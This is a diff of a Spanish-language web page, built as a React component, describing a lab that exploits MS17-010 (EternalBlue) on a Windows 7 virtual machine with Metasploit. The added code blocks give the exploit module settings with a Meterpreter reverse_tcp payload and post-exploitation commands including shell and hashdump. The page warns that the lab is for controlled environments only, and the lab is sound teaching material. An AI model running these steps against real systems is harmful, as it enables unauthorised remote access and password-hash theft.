@@ -19,10 +19,9 @@ export default function MetasploitLab() {
         <h2 className="text-2xl font-bold mb-3">Objetivo del laboratorio</h2>
         <hr className="mb-6 border-t border-border" />
         <p className="text-foreground text-justify">
-          Este laboratorio detalla el proceso de explotación de una vulnerabilidad en un sistema operativo
-          Windows 7 utilizando la herramienta Metasploit Framework. El objetivo es demostrar la capacidad
-          de identificar, explotar y obtener acceso a un sistema vulnerable, así como realizar acciones
-          post-explotación.
+          Este laboratorio detalla el proceso de explotación de la vulnerabilidad MS17-010 (EternalBlue) en un sistema Windows 7
+          utilizando la interfaz de línea de comandos (CLI) del Metasploit Framework. El objetivo es demostrar cómo identificar,
+          explotar y realizar acciones post-explotación en un sistema vulnerable.
         </p>
       </section>
 
@@ -33,7 +32,8 @@ export default function MetasploitLab() {
         <ul className="list-disc pl-6 space-y-2 text-foreground">
           <li><b>Kali Linux</b> (máquina atacante)</li>
           <li><b>Windows 7 Ultimate SP1</b> (máquina víctima)</li>
-          <li><b>Metasploit Framework</b></li>
+          <li><b>Metasploit Framework</b> (herramienta de explotación)</li>
+          <li><b>PostgreSQL</b> (base de datos para Metasploit)</li>
         </ul>
       </section>
 
@@ -41,111 +41,118 @@ export default function MetasploitLab() {
       <section className="mb-10">
         <h2 className="text-2xl font-bold mb-3">Procedimiento paso a paso</h2>
         <hr className="mb-6 border-t border-border" />
-        <div className="space-y-10">
-          {/* Paso 1 */}
-          <div>
-            <h3 className="text-xl font-semibold mb-2">1. Configuración del entorno</h3>
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-4">
-              <div className="bg-card p-6 rounded-lg">
-                <h4 className="text-lg font-semibold mb-2">Máquina Atacante</h4>
-                <ul className="list-disc pl-6 space-y-2 text-foreground">
-                  <li>Sistema Operativo: Kali Linux</li>
-                  <li>Herramientas: Metasploit Framework</li>
-                  <li>IP: 192.168.88.128</li>
-                </ul>
-              </div>
-              <div className="bg-card p-6 rounded-lg">
-                <h4 className="text-lg font-semibold mb-2">Máquina Víctima</h4>
-                <ul className="list-disc pl-6 space-y-2 text-foreground">
-                  <li>Sistema Operativo: Windows 7 Ultimate SP1</li>
-                  <li>Versión: 6.1.7601</li>
-                  <li>IP: 192.168.88.129</li>
-                </ul>
-              </div>
-            </div>
+
+        {/* Paso 1 */}
+        <div className="mb-8">
+          <h3 className="text-xl font-semibold mb-4">1. Configuración del entorno</h3>
+          <p className="mb-4">Iniciar los servicios necesarios y la consola de Metasploit:</p>
+          <div className="bg-muted p-4 rounded-md my-4 overflow-x-auto">
+            <pre className="text-sm"><code>sudo systemctl start postgresql
+sudo msfdb init
+msfconsole</code></pre>
           </div>
-          {/* Paso 2 */}
-          <div>
-            <h3 className="text-xl font-semibold mb-2">2. Reconocimiento de la red</h3>
-            <p className="mb-4">Verificación de conectividad entre la máquina atacante y la víctima:</p>
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-              <div>
-                <h4 className="text-lg font-semibold mb-2">Verificación en Windows 7 (Víctima)</h4>
-                <p className="mb-2">Obtenemos la dirección IP del sistema usando ipconfig:</p>
+          <div className="flex justify-center my-4">
+            <Image
+              src="/lab1/metasploit/0.png"
+              alt="Inicio de msfconsole"
+              width={500}
+              height={320}
+              className="rounded-lg shadow"
+            />
+          </div>
+        </div>
+
+        {/* Paso 2 */}
+        <div className="mb-8">
+          <h3 className="text-xl font-semibold mb-4">2. Reconocimiento de la red</h3>
+          <p className="mb-4">Verificar la conectividad entre las máquinas y obtener información del objetivo:</p>
+          <div className="grid grid-cols-1 gap-6">
+            <div>
+              <h4 className="text-lg font-semibold mb-2">Información de la máquina víctima</h4>
+              <div className="bg-muted p-4 rounded-md my-4 overflow-x-auto">
+                <pre className="text-sm"><code># Máquina Atacante (Kali Linux)
+IP: 192.168.88.128
+
+# Máquina Víctima (Windows 7)
+IP: 192.168.88.129
+Versión: Windows 7 Ultimate SP1 (6.1.7601)</code></pre>
+              </div>
+              <div className="flex justify-center my-4">
                 <Image
                   src="/lab1/metasploit/2.png"
                   alt="Configuración IP de Windows"
                   width={500}
                   height={320}
-                  className="rounded-lg shadow mb-4"
-                />
-              </div>
-              <div>
-                <h4 className="text-lg font-semibold mb-2">Verificación en Kali Linux (Atacante)</h4>
-                <p className="mb-2">Iniciando msfconsole:</p>
-                <Image
-                  src="/lab1/metasploit/0.png"
-                  alt="Inicio de msfconsole"
-                  width={500}
-                  height={320}
-                  className="rounded-lg shadow mb-4"
-                />
-                <p className="mb-2">Verificación de red y conectividad:</p>
-                <Image
-                  src="/lab1/metasploit/3.png"
-                  alt="Verificación de red"
-                  width={500}
-                  height={320}
-                  className="rounded-lg shadow mb-4"
+                  className="rounded-lg shadow"
                 />
               </div>
             </div>
           </div>
-          {/* Paso 3 */}
-          <div>
-            <h3 className="text-xl font-semibold mb-2">3. Explotación de la vulnerabilidad MS17-010 (EternalBlue)</h3>
-            <p className="mb-4">
-              Configuración y ejecución del exploit EternalBlue para obtener acceso remoto a la máquina víctima.
-            </p>
-            {/* Aquí podrías agregar imágenes del proceso si las tienes */}
+        </div>
+
+        {/* Paso 3 */}
+        <div className="mb-8">
+          <h3 className="text-xl font-semibold mb-4">3. Explotación de la vulnerabilidad MS17-010 (EternalBlue)</h3>
+          <p className="mb-4">Configurar y ejecutar el exploit EternalBlue:</p>
+          <div className="bg-muted p-4 rounded-md my-4 overflow-x-auto">
+            <pre className="text-sm"><code>use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.88.129  # IP de la víctima
+set LHOST 192.168.88.128   # IP del atacante
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run</code></pre>
           </div>
-          {/* Paso 4 */}
-          <div>
-            <h3 className="text-xl font-semibold mb-2">4. Post-explotación</h3>
-            <p className="mb-4">
-              Acciones realizadas después de obtener acceso al sistema:
-            </p>
-            <div className="space-y-6">
-              <div>
-                <h4 className="text-lg font-semibold mb-2">Información del sistema</h4>
-                <Image
-                  src="/lab1/metasploit/lanzamos el primer ataque para ver la info del sistema.png"
-                  alt="Información del sistema"
-                  width={500}
-                  height={320}
-                  className="rounded-lg shadow mb-4"
-                />
-              </div>
-              <div>
-                <h4 className="text-lg font-semibold mb-2">Captura de pantalla remota</h4>
-                <Image
-                  src="/lab1/metasploit/segundo ataque, screenshot, pantallazo a la pantalla del equipo de la victima.png"
-                  alt="Captura de pantalla del sistema víctima"
-                  width={500}
-                  height={320}
-                  className="rounded-lg shadow mb-4"
-                />
-              </div>
-              <div>
-                <h4 className="text-lg font-semibold mb-2">Shell del sistema</h4>
-                <Image
-                  src="/lab1/metasploit/tercer ataque, shell,escalamiento de privilegios.png"
-                  alt="Shell del sistema"
-                  width={500}
-                  height={320}
-                  className="rounded-lg shadow mb-4"
-                />
-              </div>
+          <div className="flex justify-center my-4">
+            <Image
+              src="/lab1/metasploit/3.png"
+              alt="Configuración del exploit"
+              width={500}
+              height={320}
+              className="rounded-lg shadow"
+            />
+          </div>
+        </div>
+
+        {/* Paso 4 */}
+        <div className="mb-8">
+          <h3 className="text-xl font-semibold mb-4">4. Post-explotación</h3>
+          <p className="mb-4">Comandos útiles para la fase de post-explotación:</p>
+          <div className="bg-muted p-4 rounded-md my-4 overflow-x-auto">
+            <pre className="text-sm"><code>sysinfo        # Obtener información del sistema
+getuid         # Ver usuario actual
+screenshot     # Capturar pantalla
+shell          # Obtener shell del sistema
+hashdump       # Extraer hashes de contraseñas</code></pre>
+          </div>
+          <div className="space-y-6">
+            <div>
+              <h4 className="text-lg font-semibold mb-2">Información del sistema comprometido</h4>
+              <Image
+                src="/lab1/metasploit/lanzamos el primer ataque para ver la info del sistema.png"
+                alt="Información del sistema"
+                width={500}
+                height={320}
+                className="rounded-lg shadow mb-4"
+              />
+            </div>
+            <div>
+              <h4 className="text-lg font-semibold mb-2">Captura de pantalla remota</h4>
+              <Image
+                src="/lab1/metasploit/segundo ataque, screenshot, pantallazo a la pantalla del equipo de la victima.png"
+                alt="Captura de pantalla del sistema víctima"
+                width={500}
+                height={320}
+                className="rounded-lg shadow mb-4"
+              />
+            </div>
+            <div>
+              <h4 className="text-lg font-semibold mb-2">Shell del sistema y escalamiento de privilegios</h4>
+              <Image
+                src="/lab1/metasploit/tercer ataque, shell,escalamiento de privilegios.png"
+                alt="Shell del sistema"
+                width={500}
+                height={320}
+                className="rounded-lg shadow mb-4"
+              />
             </div>
           </div>
         </div>
@@ -156,26 +163,24 @@ export default function MetasploitLab() {
         <h2 className="text-2xl font-bold mb-3">Resultados esperados</h2>
         <hr className="mb-6 border-t border-border" />
         <p className="text-foreground text-justify">
-          Se espera obtener acceso remoto a la máquina Windows 7 víctima, demostrando la explotación exitosa de la vulnerabilidad y la capacidad de realizar acciones de post-explotación como obtención de información, captura de pantalla y acceso a la shell del sistema.
+          Al completar este laboratorio, se habrá logrado:
         </p>
-      </section>
-
-      {/* Conclusiones */}
-      <section className="mb-10">
-        <h2 className="text-2xl font-bold mb-3">Conclusiones</h2>
-        <hr className="mb-6 border-t border-border" />
-        <ul className="list-disc pl-6 space-y-2 text-foreground">
-          <li>La explotación de vulnerabilidades conocidas puede comprometer sistemas desactualizados.</li>
-          <li>El uso de herramientas como Metasploit facilita la automatización y el éxito de ataques complejos.</li>
-          <li>La post-explotación permite un control avanzado sobre el sistema comprometido.</li>
+        <ul className="list-disc pl-6 space-y-2 text-foreground mt-4">
+          <li>Explotar exitosamente la vulnerabilidad MS17-010 en Windows 7</li>
+          <li>Obtener acceso remoto al sistema mediante una sesión Meterpreter</li>
+          <li>Ejecutar comandos de post-explotación para extraer información sensible</li>
+          <li>Demostrar el impacto de sistemas desactualizados en la seguridad</li>
         </ul>
       </section>
 
       {/* Aviso legal */}
       <div className="bg-destructive/10 p-6 rounded-lg mt-8">
         <h4 className="text-lg font-semibold mb-2 text-destructive">⚠️ Aviso legal</h4>
-        <p className="text-foreground">
-          Este laboratorio debe realizarse únicamente en un entorno controlado y con permiso explícito. La explotación no autorizada de sistemas puede tener graves consecuencias legales. El objetivo es puramente educativo para comprender el funcionamiento de las vulnerabilidades y mejorar las defensas de los sistemas.
+        <p className="text-foreground text-justify">
+          Este laboratorio debe realizarse únicamente en un entorno controlado y con permiso explícito.
+          La explotación no autorizada de sistemas puede tener graves consecuencias legales. El objetivo
+          es puramente educativo para comprender el funcionamiento de las vulnerabilidades y mejorar las
+          defensas de los sistemas.
         </p>
       </div>
     </div>
